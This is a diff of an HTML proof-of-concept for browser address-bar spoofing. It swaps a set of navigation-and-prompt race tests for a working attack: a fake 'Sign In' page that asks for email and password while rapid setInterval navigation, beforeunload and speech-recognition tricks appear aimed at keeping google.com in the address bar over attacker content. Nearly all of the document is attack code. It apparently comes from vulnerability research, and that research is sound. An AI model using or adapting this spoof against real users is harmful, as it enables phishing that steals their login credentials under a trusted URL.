@@ -2,79 +2,48 @@
 <html lang="en-US">
 <head>
 	<meta charset="UTF-8">
-	<title>Omnibox spoofing - Prompt Race Test</title>
+	<title>Omnibox spoofing</title>
 	<script>
-		// Technique 1: Navigate via anchor click, prompt via beforeunload
-		// The browser starts navigation (address bar updates) then beforeunload fires
-		function technique1() {
-			var a = document.createElement('a');
-			a.href = 'https://mixed.badssl.com';
-			document.body.appendChild(a);
+		function go() {
+			// Replace page content with a generic login form
+			document.documentElement.innerHTML = `
+			<head><title>Sign In</title></head>
+			<body style="margin:0; font-family:Arial,sans-serif; background:#f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh;">
+				<div style="background:#fff; padding:40px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:350px; text-align:center;">
+					<h2 style="margin:0 0 8px; font-size:24px; color:#333;">Sign In</h2>
+					<p style="color:#666; font-size:14px; margin:0 0 24px;">Continue to your account</p>
+					<input type="email" placeholder="Email" style="width:100%; padding:12px; margin:0 0 12px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box; font-size:14px;">
+					<input type="password" placeholder="Password" style="width:100%; padding:12px; margin:0 0 20px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box; font-size:14px;">
+					<button style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; cursor:pointer;">Sign In</button>
+					<p style="margin-top:16px; font-size:12px; color:#999;">This is a PoC — content controlled by attacker origin</p>
+				</div>
+			</body>`;
 
-			window.onbeforeunload = function() {
-				prompt("Test: check address bar - does it show badssl.com?");
-			};
-
-			a.click();
+			// Navigate address bar to google.com
+			setInterval(function() {
+				document.location = 'https://www.google.com';
+			}, 1);
 		}
 
-		// Technique 2: Use form submission to navigate, prompt in beforeunload
-		function technique2() {
-			window.onbeforeunload = function() {
-				prompt("Test: check address bar - does it show badssl.com?");
-			};
-
-			var form = document.createElement('form');
-			form.method = 'GET';
-			form.action = 'https://mixed.badssl.com';
-			document.body.appendChild(form);
-			form.submit();
-		}
-
-		// Technique 3: Navigate first, then rapid prompt via micro-task timing
-		function technique3() {
-			window.location.href = 'https://mixed.badssl.com';
-
-			// Queue prompt after navigation starts using different async mechanisms
-			// Try multiple timing strategies
-			Promise.resolve().then(function() {
-				prompt("Test (microtask): check address bar now");
-			});
-		}
-
-		// Technique 4: window.open + opener prompt
-		function technique4() {
-			var w = window.open('https://mixed.badssl.com', '_self');
-			setTimeout(function() {
-				prompt("Test (setTimeout): check address bar now");
+		window.onbeforeunload = function() {
+			setInterval(function() {
+				document.location = 'https://www.google.com';
+				try {
+					var recognition = new webkitSpeechRecognition();
+					recognition.onstart = function() {
+						document.location = 'https://www.google.com';
+					};
+					recognition.start();
+				} catch(e) {}
 			}, 0);
-		}
-
-		// Technique 5: History API + prompt
-		function technique5() {
-			history.pushState({}, '', 'https://mixed.badssl.com');
-			prompt("Test (pushState): check address bar now");
-		}
+		};
 	</script>
 </head>
 
 <body>
 	<center>
 		<br>
-		<h3>Address Bar + Prompt Race Condition Test</h3>
-		<p>Each button tests a different technique. Check if the address bar<br>shows the destination URL while the prompt is visible.</p>
-		<br>
-		<input type="button" value="Technique 1: Anchor + beforeunload" onclick="technique1()">
-		<br><br>
-		<input type="button" value="Technique 2: Form submit + beforeunload" onclick="technique2()">
-		<br><br>
-		<input type="button" value="Technique 3: location.href + microtask" onclick="technique3()">
-		<br><br>
-		<input type="button" value="Technique 4: window.open(_self) + setTimeout" onclick="technique4()">
-		<br><br>
-		<input type="button" value="Technique 5: history.pushState + prompt" onclick="technique5()">
-		<br><br>
-		<p><small>PoC: Tests whether address bar updates before prompt blocks the thread</small></p>
+		<input id="foo" type="button" value="Click here" onclick="go()">
 	</center>
 </body>
 
